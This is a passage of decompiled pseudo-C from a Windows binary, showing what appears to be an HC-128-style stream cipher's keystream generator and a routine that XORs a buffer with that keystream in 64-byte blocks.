  for ( i = 0; i < 0x50; result = i )
  {
    *(_BYTE *)(a4 + (int)i) = *((_BYTE *)v20 + (int)i);
    ++i;
  }
  return result;
}
// 14000BB1E: variable 'v17' is possibly undefined

//----- (000000014000BB67) ----------------------------------------------------
__int64 __fastcall sub_14000BB67(__int64 a1, __int64 a2, int *a3, __int64 a4, int *a5)
{
  __int64 v6; // rdx
  __int64 v7; // rdx
  __int64 result; // rax
  unsigned int i; // [rsp+2Ch] [rbp-ACh]
  __int64 v10[21]; // [rsp+30h] [rbp-A8h] BYREF

  sub_14000B10A((__int64)v10, a4, a3, v10, a5);
  sub_14000B6F9((__int64)v10, a4, v6, v10);
  sub_14000B7B5((__int64)v10, a4, v7, v10);
  for ( i = 0; i < 0x50; result = i )
  {
    *(_BYTE *)(a4 + (int)i) = *((_BYTE *)v10 + (int)i);
    ++i;
  }
  return result;
}
// 14000BB83: variable 'v6' is possibly undefined
// 14000BB8B: variable 'v7' is possibly undefined

//----- (000000014000BBC9) ----------------------------------------------------
int *__fastcall sub_14000BBC9(__int64 a1, __int64 a2, int *a3, _DWORD *a4)
{
  unsigned int v4; // eax
  __int64 v5; // r14
  unsigned int v6; // r8d
  int v7; // edi
  int *result; // rax
  int v9; // esi
  int v10; // ebx
  int v11; // edi
  int v12; // ebx
  int v13; // esi
  int v14; // edi
  int v15; // esi
  int v16; // ebx
  int v17; // edi
  int v18; // edi
  int v19; // esi
  int v20; // ebx
  int v21; // edi
  int v22; // edi
  int v23; // esi
  int v24; // ebx
  int v25; // edi
  int v26; // edi
  int v27; // esi
  int v28; // ebx
  int v29; // esi
  int v30; // ebx
  int v31; // edi
  int v32; // ebx
  int v33; // edi
  int v34; // ebx
  int v35; // edi
  int v36; // ebx
  int v37; // edi
  int v38; // esi
  int v39; // edi
  int v40; // esi
  __int64 v41; // r14
  int v42; // ebp
  int v43; // esi
  int v44; // edi
  int v45; // esi
  int v46; // ebx
  int v47; // edi
  int v48; // ebp
  int v49; // esi
  int v50; // edi
  int v51; // edi
  int v52; // ebp
  int v53; // esi
  int v54; // edi
  int v55; // edi
  int v56; // ebp
  int v57; // esi
  int v58; // edi
  int v59; // edi
  int v60; // ebx
  int v61; // esi
  int v62; // ebx
  int v63; // esi
  int v64; // ebp
  int v65; // esi
  int v66; // edi
  int v67; // esi
  int v68; // ebp
  int v69; // esi
  int v70; // edi
  int v71; // ebx

  v4 = a4[1056];
  v5 = v4 & 0x1FF;
  v6 = (v4 + 16) & 0x1FF;
  a4[1056] = (v4 + 16) & 0x3FF;
  if ( v4 > 0x1FF )
  {
    v40 = a4[(unsigned __int8)a4[1044]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1044] >> 14) & 0x3FC) + 1024);
    v41 = (unsigned int)v5 | 0x200;
    result = &a4[v41 + 15];
    v42 = a4[v41] + (__ROL4__(a4[v41 + 1], 23) ^ __ROL4__(a4[1053], 10)) + __ROL4__(a4[1046], 8);
    *(result - 15) = v42;
    a4[1040] = v42;
    *a3 = a4[v41] ^ v40;
    v43 = a4[(unsigned __int8)a4[1045]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1045] >> 14) & 0x3FC) + 1024);
    v44 = a4[v41 + 1] + (__ROL4__(a4[v41 + 2], 23) ^ __ROL4__(a4[1054], 10)) + __ROL4__(a4[1047], 8);
    *(result - 14) = v44;
    a4[1041] = v44;
    a3[1] = a4[v41 + 1] ^ v43;
    v45 = a4[(unsigned __int8)a4[1046]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1046] >> 14) & 0x3FC) + 1024);
    v46 = a4[v41 + 2] + (__ROL4__(a4[v41 + 3], 23) ^ __ROL4__(a4[1055], 10)) + __ROL4__(a4[1048], 8);
    *(result - 13) = v46;
    a4[1042] = v46;
    a3[2] = a4[v41 + 2] ^ v45;
    v47 = a4[(unsigned __int8)a4[1047]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1047] >> 14) & 0x3FC) + 1024);
    v48 = a4[v41 + 3] + (__ROL4__(a4[v41 + 4], 23) ^ __ROL4__(a4[1040], 10)) + __ROL4__(a4[1049], 8);
    *(result - 12) = v48;
    a4[1043] = v48;
    a3[3] = a4[v41 + 3] ^ v47;
    v49 = a4[(unsigned __int8)a4[1048]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1048] >> 14) & 0x3FC) + 1024);
    v50 = a4[v41 + 4] + (__ROL4__(a4[v41 + 5], 23) ^ __ROL4__(a4[1041], 10)) + __ROL4__(a4[1050], 8);
    *(result - 11) = v50;
    a4[1044] = v50;
    a3[4] = a4[v41 + 4] ^ v49;
    v51 = a4[(unsigned __int8)a4[1049]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1049] >> 14) & 0x3FC) + 1024);
    v52 = a4[v41 + 5] + (__ROL4__(a4[v41 + 6], 23) ^ __ROL4__(a4[1042], 10)) + __ROL4__(a4[1051], 8);
    *(result - 10) = v52;
    a4[1045] = v52;
    a3[5] = a4[v41 + 5] ^ v51;
    v53 = a4[(unsigned __int8)a4[1050]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1050] >> 14) & 0x3FC) + 1024);
    v54 = a4[v41 + 6] + (__ROL4__(a4[v41 + 7], 23) ^ __ROL4__(a4[1043], 10)) + __ROL4__(a4[1052], 8);
    *(result - 9) = v54;
    a4[1046] = v54;
    a3[6] = a4[v41 + 6] ^ v53;
    v55 = a4[(unsigned __int8)a4[1051]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1051] >> 14) & 0x3FC) + 1024);
    v56 = a4[v41 + 7] + (__ROL4__(a4[v41 + 8], 23) ^ __ROL4__(a4[1044], 10)) + __ROL4__(a4[1053], 8);
    *(result - 8) = v56;
    a4[1047] = v56;
    a3[7] = a4[v41 + 7] ^ v55;
    v57 = a4[(unsigned __int8)a4[1052]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1052] >> 14) & 0x3FC) + 1024);
    v58 = a4[v41 + 8] + (__ROL4__(a4[v41 + 9], 23) ^ __ROL4__(a4[1045], 10)) + __ROL4__(a4[1054], 8);
    *(result - 7) = v58;
    a4[1048] = v58;
    a3[8] = a4[v41 + 8] ^ v57;
    v59 = a4[(unsigned __int8)a4[1053]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1053] >> 14) & 0x3FC) + 1024);
    v60 = a4[v41 + 9] + (__ROL4__(a4[v41 + 10], 23) ^ __ROL4__(a4[1046], 10)) + __ROL4__(a4[1055], 8);
    *(result - 6) = v60;
    a4[1049] = v60;
    a3[9] = a4[v41 + 9] ^ v59;
    v61 = a4[(unsigned __int8)a4[1054]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1054] >> 14) & 0x3FC) + 1024);
    v62 = a4[v41 + 10] + (__ROL4__(a4[v41 + 11], 23) ^ __ROL4__(a4[1047], 10)) + __ROL4__(a4[1040], 8);
    *(result - 5) = v62;
    a4[1050] = v62;
    a3[10] = a4[v41 + 10] ^ v61;
    v63 = a4[(unsigned __int8)a4[1055]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1055] >> 14) & 0x3FC) + 1024);
    v64 = a4[v41 + 11] + (__ROL4__(a4[v41 + 12], 23) ^ __ROL4__(a4[1048], 10)) + __ROL4__(a4[1041], 8);
    *(result - 4) = v64;
    a4[1051] = v64;
    a3[11] = a4[v41 + 11] ^ v63;
    v65 = a4[(unsigned __int8)a4[1040]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1040] >> 14) & 0x3FC) + 1024);
    v66 = a4[v41 + 12] + (__ROL4__(a4[v41 + 13], 23) ^ __ROL4__(a4[1049], 10)) + __ROL4__(a4[1042], 8);
    *(result - 3) = v66;
    a4[1052] = v66;
    a3[12] = a4[v41 + 12] ^ v65;
    v67 = a4[(unsigned __int8)a4[1041]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1041] >> 14) & 0x3FC) + 1024);
    v68 = a4[v41 + 13] + (__ROL4__(a4[v41 + 14], 23) ^ __ROL4__(a4[1050], 10)) + __ROL4__(a4[1043], 8);
    *(result - 2) = v68;
    a4[1053] = v68;
    a3[13] = a4[v41 + 13] ^ v67;
    v69 = a4[(unsigned __int8)a4[1042]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1042] >> 14) & 0x3FC) + 1024);
    v70 = a4[v41 + 14] + (__ROL4__(*result, 23) ^ __ROL4__(a4[1051], 10)) + __ROL4__(a4[1044], 8);
    *(result - 1) = v70;
    a4[1054] = v70;
    a3[14] = a4[v41 + 14] ^ v69;
    v38 = a4[(unsigned __int8)a4[1043]]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1043] >> 14) & 0x3FC) + 1024);
    v71 = *result + (__ROL4__(a4[v6 | 0x200], 23) ^ __ROL4__(a4[1052], 10)) + __ROL4__(a4[1045], 8);
    *result = v71;
    a4[1055] = v71;
  }
  else
  {
    v7 = a4[(unsigned __int8)a4[1028] + 512]
       + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1028] >> 14) & 0x3FC) + 3072);
    result = &a4[(v4 & 0x1FF) + 15];
    v9 = a4[(unsigned int)v5] + (__ROL4__(a4[v5 + 1], 9) ^ __ROL4__(a4[1037], 22)) + __ROL4__(a4[1030], 24);
    *(result - 15) = v9;
    a4[1024] = v9;
    *a3 = a4[(unsigned int)v5] ^ v7;
    v10 = a4[(unsigned __int8)a4[1029] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1029] >> 14) & 0x3FC) + 3072);
    v11 = a4[v5 + 1] + (__ROL4__(a4[(unsigned int)v5 + 2], 9) ^ __ROL4__(a4[1038], 22)) + __ROL4__(a4[1031], 24);
    a4[v5 + 1] = v11;
    a4[1025] = v11;
    a3[1] = a4[v5 + 1] ^ v10;
    v12 = a4[(unsigned __int8)a4[1030] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1030] >> 14) & 0x3FC) + 3072);
    v13 = a4[(unsigned int)v5 + 2]
        + (__ROL4__(a4[(unsigned int)v5 + 3], 9) ^ __ROL4__(a4[1039], 22))
        + __ROL4__(a4[1032], 24);
    *(result - 13) = v13;
    a4[1026] = v13;
    a3[2] = a4[(unsigned int)v5 + 2] ^ v12;
    v14 = a4[(unsigned __int8)a4[1031] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1031] >> 14) & 0x3FC) + 3072);
    v15 = a4[(unsigned int)v5 + 3]
        + (__ROL4__(a4[(unsigned int)v5 + 4], 9) ^ __ROL4__(a4[1024], 22))
        + __ROL4__(a4[1033], 24);
    *(result - 12) = v15;
    a4[1027] = v15;
    a3[3] = a4[(unsigned int)v5 + 3] ^ v14;
    v16 = a4[(unsigned __int8)a4[1032] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1032] >> 14) & 0x3FC) + 3072);
    v17 = a4[(unsigned int)v5 + 4]
        + (__ROL4__(a4[(unsigned int)v5 + 5], 9) ^ __ROL4__(a4[1025], 22))
        + __ROL4__(a4[1034], 24);
    *(result - 11) = v17;
    a4[1028] = v17;
    a3[4] = a4[(unsigned int)v5 + 4] ^ v16;
    v18 = a4[(unsigned __int8)a4[1033] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1033] >> 14) & 0x3FC) + 3072);
    v19 = a4[(unsigned int)v5 + 5]
        + (__ROL4__(a4[(unsigned int)v5 + 6], 9) ^ __ROL4__(a4[1026], 22))
        + __ROL4__(a4[1035], 24);
    *(result - 10) = v19;
    a4[1029] = v19;
    a3[5] = a4[(unsigned int)v5 + 5] ^ v18;
    v20 = a4[(unsigned __int8)a4[1034] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1034] >> 14) & 0x3FC) + 3072);
    v21 = a4[(unsigned int)v5 + 6]
        + (__ROL4__(a4[(unsigned int)v5 + 7], 9) ^ __ROL4__(a4[1027], 22))
        + __ROL4__(a4[1036], 24);
    *(result - 9) = v21;
    a4[1030] = v21;
    a3[6] = a4[(unsigned int)v5 + 6] ^ v20;
    v22 = a4[(unsigned __int8)a4[1035] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1035] >> 14) & 0x3FC) + 3072);
    v23 = a4[(unsigned int)v5 + 7]
        + (__ROL4__(a4[(unsigned int)v5 + 8], 9) ^ __ROL4__(a4[1028], 22))
        + __ROL4__(a4[1037], 24);
    *(result - 8) = v23;
    a4[1031] = v23;
    a3[7] = a4[(unsigned int)v5 + 7] ^ v22;
    v24 = a4[(unsigned __int8)a4[1036] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1036] >> 14) & 0x3FC) + 3072);
    v25 = a4[(unsigned int)v5 + 8]
        + (__ROL4__(a4[(unsigned int)v5 + 9], 9) ^ __ROL4__(a4[1029], 22))
        + __ROL4__(a4[1038], 24);
    *(result - 7) = v25;
    a4[1032] = v25;
    a3[8] = a4[(unsigned int)v5 + 8] ^ v24;
    v26 = a4[(unsigned __int8)a4[1037] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1037] >> 14) & 0x3FC) + 3072);
    v27 = a4[(unsigned int)v5 + 9]
        + (__ROL4__(a4[(unsigned int)v5 + 10], 9) ^ __ROL4__(a4[1030], 22))
        + __ROL4__(a4[1039], 24);
    *(result - 6) = v27;
    a4[1033] = v27;
    a3[9] = a4[(unsigned int)v5 + 9] ^ v26;
    v28 = a4[(unsigned __int8)a4[1038] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1038] >> 14) & 0x3FC) + 3072);
    v29 = a4[(unsigned int)v5 + 10]
        + (__ROL4__(a4[(unsigned int)v5 + 11], 9) ^ __ROL4__(a4[1031], 22))
        + __ROL4__(a4[1024], 24);
    *(result - 5) = v29;
    a4[1034] = v29;
    a3[10] = a4[(unsigned int)v5 + 10] ^ v28;
    v30 = a4[(unsigned __int8)a4[1039] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1039] >> 14) & 0x3FC) + 3072);
    v31 = a4[(unsigned int)v5 + 11]
        + (__ROL4__(a4[(unsigned int)v5 + 12], 9) ^ __ROL4__(a4[1032], 22))
        + __ROL4__(a4[1025], 24);
    *(result - 4) = v31;
    a4[1035] = v31;
    a3[11] = a4[(unsigned int)v5 + 11] ^ v30;
    v32 = a4[(unsigned __int8)a4[1024] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1024] >> 14) & 0x3FC) + 3072);
    v33 = a4[(unsigned int)v5 + 12]
        + (__ROL4__(a4[(unsigned int)v5 + 13], 9) ^ __ROL4__(a4[1033], 22))
        + __ROL4__(a4[1026], 24);
    *(result - 3) = v33;
    a4[1036] = v33;
    a3[12] = a4[(unsigned int)v5 + 12] ^ v32;
    v34 = a4[(unsigned __int8)a4[1025] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1025] >> 14) & 0x3FC) + 3072);
    v35 = a4[(unsigned int)v5 + 13]
        + (__ROL4__(a4[(unsigned int)v5 + 14], 9) ^ __ROL4__(a4[1034], 22))
        + __ROL4__(a4[1027], 24);
    *(result - 2) = v35;
    a4[1037] = v35;
    a3[13] = a4[(unsigned int)v5 + 13] ^ v34;
    v36 = a4[(unsigned __int8)a4[1026] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1026] >> 14) & 0x3FC) + 3072);
    v37 = a4[(unsigned int)v5 + 14] + (__ROL4__(*result, 9) ^ __ROL4__(a4[1035], 22)) + __ROL4__(a4[1028], 24);
    *(result - 1) = v37;
    a4[1038] = v37;
    a3[14] = a4[(unsigned int)v5 + 14] ^ v36;
    v38 = a4[(unsigned __int8)a4[1027] + 512]
        + *(_DWORD *)((char *)a4 + (((unsigned __int64)(unsigned int)a4[1027] >> 14) & 0x3FC) + 3072);
    v39 = *result + (__ROL4__(a4[v6], 9) ^ __ROL4__(a4[1036], 22)) + __ROL4__(a4[1029], 24);
    *result = v39;
    a4[1039] = v39;
  }
  a3[15] = *result ^ v38;
  return result;
}

//----- (000000014000C600) ----------------------------------------------------
__int64 __fastcall sub_14000C600(__int64 a1, __int64 a2, _DWORD *a3, _DWORD *a4, int *a5, unsigned int a6)
{
  unsigned int v6; // ebx
  __int64 result; // rax
  __int64 i; // rcx
  int v12[26]; // [rsp+20h] [rbp-68h] BYREF

  v6 = a6;
  if ( a6 >= 0x40 )
  {
    do
    {
      sub_14000BBC9((__int64)a3, (__int64)a5, v12, a4);
      *a5 = *a3 ^ v12[0];
      a5[1] = a3[1] ^ v12[1];
      a5[2] = a3[2] ^ v12[2];
      a5[3] = a3[3] ^ v12[3];
      a5[4] = a3[4] ^ v12[4];
      a5[5] = a3[5] ^ v12[5];
      a5[6] = a3[6] ^ v12[6];
      a5[7] = a3[7] ^ v12[7];
      a5[8] = a3[8] ^ v12[8];
      a5[9] = a3[9] ^ v12[9];
      a5[10] = a3[10] ^ v12[10];
      a5[11] = a3[11] ^ v12[11];
      a5[12] = a3[12] ^ v12[12];
      a5[13] = a3[13] ^ v12[13];
      a5[14] = a3[14] ^ v12[14];
      result = (unsigned int)(a3[15] ^ v12[15]);
      a5[15] = result;
      v6 -= 64;
      a3 += 16;
      a5 += 16;
    }
    while ( v6 > 0x3F );
  }
  if ( v6 )
  {
    sub_14000BBC9((__int64)a3, (__int64)a5, v12, a4);
    result = v6;
    for ( i = 0LL; i != v6; ++i )
      *((_BYTE *)a5 + i) = *((_BYTE *)a3 + i) ^ *((_BYTE *)v12 + i);
  }
  return result;
}

// nfuncs=255 queued=140 decompiled=140 lumina nreq=0 worse=0 better=0
// ALL OK, 140 function(s) have been successfully decompiled
